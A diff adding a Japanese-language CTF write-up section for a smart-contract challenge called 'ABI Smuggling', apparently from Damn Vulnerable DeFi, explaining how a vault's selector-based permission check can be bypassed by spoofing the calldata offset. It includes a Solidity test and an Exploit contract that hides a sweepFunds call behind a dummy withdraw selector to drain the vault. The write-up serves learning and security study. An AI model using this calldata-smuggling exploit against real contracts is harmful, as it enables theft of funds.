@@ -344,3 +344,50 @@ by tinamints
         
     }
 `
+
+## 15. ABI Smuggling
+### 条件 :
+- vaultから100万DVTを全額recoveryへ移す
+### 概念 :
+-  ABI smuggling
+-  calldataのoffset位置の偽装
+### 解法 :
+- `execute()`はcalldataの固定位置（100バイト目）から読み取ったselectorだけで権限チェックを行い、実際の`actionData`の位置は見ていない。そこで、プレイヤーが呼び出し許可を持つ`withdraw`のselectorを100バイト目にダミーとして配置し、実際のoffsetはさらに先にある本命のペイロード——プレイヤーが権限を持たない`sweepFunds`呼び出し——を指すようにcalldataを組み立てる。これにより権限チェックはダミーを見て通過するが、vaultは実際には密輸された`sweepFunds`を実行してしまう
+### POC
+` function test_abiSmuggling() public checkSolvedByPlayer {
+         Exploit exploit = new Exploit(address(vault),address(token),recovery);
+        bytes memory payload = exploit.executeExploit();
+        address(vault).call(payload);
+    }`
+
+`contract Exploit {
+    function executeExploit() external returns (bytes memory) {
+        bytes4 executeSelector = vault.execute.selector;
+        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
+        bytes memory emptyData = abi.encodePacked(uint256(0));
+        bytes memory withdrawSelectorPadded = abi.encodePacked(
+            bytes4(0xd9caed12),
+            bytes28(0)
+        );
+        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            token
+        );
+        uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
+
+        bytes memory calldataPayload = abi.encodePacked(
+            executeSelector,
+            target,
+            dataOffset,
+            emptyData,
+            withdrawSelectorPadded,
+            actionDataLength,
+            sweepFundsCalldata
+        );
+
+        return calldataPayload;
+    }
+}`
